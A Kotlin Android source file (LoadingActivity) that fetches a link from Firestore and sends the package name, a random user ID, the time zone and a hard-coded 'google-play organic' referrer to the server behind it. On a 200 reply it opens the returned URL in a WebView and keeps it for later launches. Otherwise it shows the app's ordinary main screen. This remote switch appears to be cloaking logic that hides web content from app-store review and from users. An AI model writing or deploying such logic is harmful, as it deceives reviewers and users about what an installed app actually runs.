package com.template

import android.Manifest
import android.content.Intent
import android.os.Build
import android.os.Bundle
import android.util.Log
import androidx.activity.result.ActivityResultLauncher
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AppCompatActivity
import androidx.lifecycle.lifecycleScope
import com.google.firebase.analytics.FirebaseAnalytics
import com.google.firebase.analytics.ktx.analytics
import com.google.firebase.firestore.ktx.firestore
import com.google.firebase.ktx.Firebase
import com.google.firebase.messaging.FirebaseMessaging
import com.template.api.ApiInterface
import com.template.api.RetrofitClient
import com.template.network.NetworkManager
import com.template.storage.AppPreferences
import java.util.TimeZone
import java.util.UUID

class LoadingActivity : AppCompatActivity() {

    private lateinit var token: String
    private lateinit var analytics: FirebaseAnalytics
    private lateinit var BASE_URL: String
    private lateinit var singlePermissionPostNotifications: ActivityResultLauncher<String>
    var appPreferences: AppPreferences? = null

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_loading)

        analytics = Firebase.analytics
        appPreferences = AppPreferences(this)

        if (NetworkManager.isNetworkAvailable(this)) {
            Log.d("network", "yes")
            if (appPreferences?.getFirestoreState() == Constants.EMPTY) {
                Log.d("yes_network", "firestore state is empty, open main activity")
                openMainActivity()
            } else { // делаем это если firestorestate EXIST или null
                Log.d("yes_network", "firestore state is not empty")
                if (appPreferences?.getLink() != null) {
                    Log.d("yes_firestore", "we have all we need")
                    Log.d("test", "open webview, link+ state+ network+")
                    openWebActivity(appPreferences?.getLink()!!)
                } else {
                    Log.d("yes_network", "firestore first open")
                    initFirebase()
                    getDataFromFirestore()
                    initRegisterForActivityResult()
                    getPermission()
                }
            }
        } else {
            Log.d("network", "no")
            if (appPreferences?.getLink() != null) {
                Log.d("no_network", "we have link")
                openWebActivity(appPreferences?.getLink()!!)
            } else {
                Log.d("no_network", "link absent")
                openMainActivity()
            }
        }
    }

    private fun initFirebase() {
        FirebaseMessaging.getInstance().token.addOnCompleteListener { task ->
            if (!task.isSuccessful) {
                return@addOnCompleteListener
            }
            token = task.result
        }
    }

    private fun getDataFromFirestore() {
        val db = Firebase.firestore
        val docData = db.collection("database").document("check")

        docData.get()
            .addOnSuccessListener { document ->
                if (document != null) {
                    Log.d("request firestore rsult", "DocumentSnapshot data: ${document.data}")
                    BASE_URL = document.data?.get("link").toString()
                    Log.d("link from firestore", BASE_URL)
                    appPreferences?.setFirestoreState(Constants.EXIST)
                    Log.d("set firestore state to", Constants.EXIST)
                    getRequest(BASE_URL)
                } else {
                    Log.d("result_db", "No such document")
                    appPreferences?.setFirestoreState(Constants.EMPTY)
                    Log.d("set firestore state to", Constants.EMPTY)
                    openMainActivity()
                }
            }
            .addOnFailureListener { exception ->
                Log.d("result_db", "get failed with ", exception)
                appPreferences?.setFirestoreState(Constants.EMPTY)
                Log.d("set firestore state to", Constants.EMPTY)
                openMainActivity()
            }

    }

    private fun getRequest(url: String) {
        val userId = UUID.randomUUID().toString()
        val timeZone = TimeZone.getDefault()
        val link =
            "$url/?packageid=$packageName&usserid=$userId&getz=$timeZone&getr=utm_source=google-play&utm_medium=organic"
        Log.d("result_db", link)
        makeRequest(link)
    }

    private fun makeRequest(link: String) {

        val retrofit = RetrofitClient.getInstance(link)
        val apiInterface = retrofit.create(ApiInterface::class.java)

        lifecycleScope.launchWhenCreated {
            try {
                val response = apiInterface.getLink()
                val code = response.code().toString()
                when (code) {
                    "403" -> {
                        val targetLink = response.body()?.link.toString()
                        Log.i("code 403 (error)", targetLink)
                        appPreferences?.setFirestoreState(Constants.EMPTY)
                        Log.d("set firestore state to", Constants.EMPTY)
                        openMainActivity()
                    }

                    "200" -> {
                        val targetLink = response.body()?.link.toString()
                        Log.i("code 200 (link)", targetLink)
                        appPreferences?.setFirestoreState(Constants.EXIST)
                        Log.d("set firestore state to", Constants.EXIST)
                        Log.d("set link to", targetLink)
                        appPreferences?.setLink(targetLink)
                        openWebActivity(targetLink)
                    }
                }

            } catch (Ex: Exception) {
                Log.e("Error", Ex.localizedMessage as String)
            }
        }
    }

    private fun openMainActivity() {
        val intent = Intent(this, MainActivity::class.java)
        startActivity(intent)
        finish()
    }

    private fun openWebActivity(link: String) {
        val intent = Intent(this, WebActivity::class.java)
        intent.putExtra(Constants.LINK, link)
        startActivity(intent)
        finish()
    }

    private fun getPermission() {
        if (Build.VERSION.SDK_INT >= 33) {
            if (shouldShowRequestPermissionRationale(Manifest.permission.POST_NOTIFICATIONS)) {
                singlePermissionPostNotifications.launch(Manifest.permission.POST_NOTIFICATIONS)
            } else {
                singlePermissionPostNotifications.launch(Manifest.permission.POST_NOTIFICATIONS)
            }
        }
    }

    private fun initRegisterForActivityResult() {
        singlePermissionPostNotifications =
            registerForActivityResult(ActivityResultContracts.RequestPermission()) { granted ->
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                    when {
                        granted -> {
                            // уведомления разрешены
                        }

                        !shouldShowRequestPermissionRationale(Manifest.permission.POST_NOTIFICATIONS) -> {
                            // пользователь нажал "больше не показывать"
                        }

                        else -> {
                            // уведомления запрещены, пользователь отклонил запрос
                        }
                    }
                }
            }
    }
}
